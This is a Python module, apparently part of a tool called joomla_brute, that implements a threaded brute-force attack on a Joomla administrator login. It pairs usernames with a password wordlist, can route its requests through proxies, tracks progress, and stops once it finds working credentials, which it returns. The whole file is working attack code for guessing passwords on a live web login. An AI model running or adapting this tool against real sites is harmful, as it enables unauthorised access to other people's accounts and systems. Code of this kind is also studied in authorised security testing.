"""Brute-force loop over usernames and passwords."""

from __future__ import annotations

import logging
import queue
import sys
import threading
from pathlib import Path

import requests
from tqdm import tqdm

from joomla_brute.auth import try_login
from joomla_brute.fileio import count_nonempty_lines, iter_nonempty_lines
from joomla_brute.reporter import print_result
from joomla_brute.session import build_session, fetch_initial_cookies

LOG = logging.getLogger(__name__)

TASK_QUEUE_MAXSIZE = 4096


def run_bruteforce(
    admin_url: str,
    wordlist: Path,
    usernames: list[str],
    *,
    proxies: dict[str, str] | None,
    log_failures: bool,
    use_color: bool,
    num_workers: int,
    show_progress: bool,
) -> tuple[bool, str | None, str | None]:
    """
    Returns (success, username, password) where success means credentials found.

    Each worker uses its own ``requests.Session`` (sessions are not thread-safe).
    """
    if num_workers < 1:
        msg = "num_workers must be >= 1"
        raise ValueError(msg)

    if show_progress:
        pw_lines = count_nonempty_lines(wordlist)
        total_attempts = len(usernames) * pw_lines
        if total_attempts == 0:
            return False, None, None
    else:
        total_attempts = None

    stop_event = threading.Event()
    task_queue: queue.Queue[tuple[str, str] | None] = queue.Queue(maxsize=TASK_QUEUE_MAXSIZE)
    result: list[tuple[str, str]] = []
    result_lock = threading.Lock()
    print_lock = threading.Lock()

    pbar = tqdm(
        total=total_attempts,
        unit="try",
        disable=not show_progress,
        mininterval=0.2,
        file=sys.stderr,
        dynamic_ncols=True,
    )

    def producer() -> None:
        try:
            for user in usernames:
                for pwd in iter_nonempty_lines(wordlist):
                    if stop_event.is_set():
                        return
                    task_queue.put((user, pwd))
        finally:
            for _ in range(num_workers):
                task_queue.put(None)

    def worker() -> None:
        session = build_session(proxies)
        healthy = True
        try:
            fetch_initial_cookies(session, admin_url)
        except requests.RequestException as e:
            LOG.error("Worker could not reach %s: %s", admin_url, e)
            healthy = False

        while True:
            item = task_queue.get()
            try:
                if item is None:
                    break
                username, password = item
                if stop_event.is_set():
                    continue
                if not healthy:
                    continue
                try:
                    ok = try_login(session, admin_url, username, password)
                except requests.RequestException as e:
                    LOG.debug("Request error for %r: %s", username, e)
                    ok = False

                if ok:
                    with result_lock:
                        if not result:
                            result.append((username, password))
                            stop_event.set()
                    print_result(
                        username,
                        password,
                        failed=False,
                        use_color=use_color,
                        lock=print_lock,
                    )
                elif log_failures:
                    print_result(
                        username,
                        password,
                        failed=True,
                        use_color=use_color,
                        lock=print_lock,
                    )
            finally:
                if item is not None:
                    pbar.update(1)
                task_queue.task_done()

    threads: list[threading.Thread] = []
    for _ in range(num_workers):
        t = threading.Thread(target=worker, daemon=False)
        threads.append(t)
        t.start()

    prod = threading.Thread(target=producer, daemon=False)
    prod.start()
    prod.join()
    task_queue.join()

    for t in threads:
        t.join()

    pbar.close()

    if result:
        u, p = result[0]
        return True, u, p
    return False, None, None
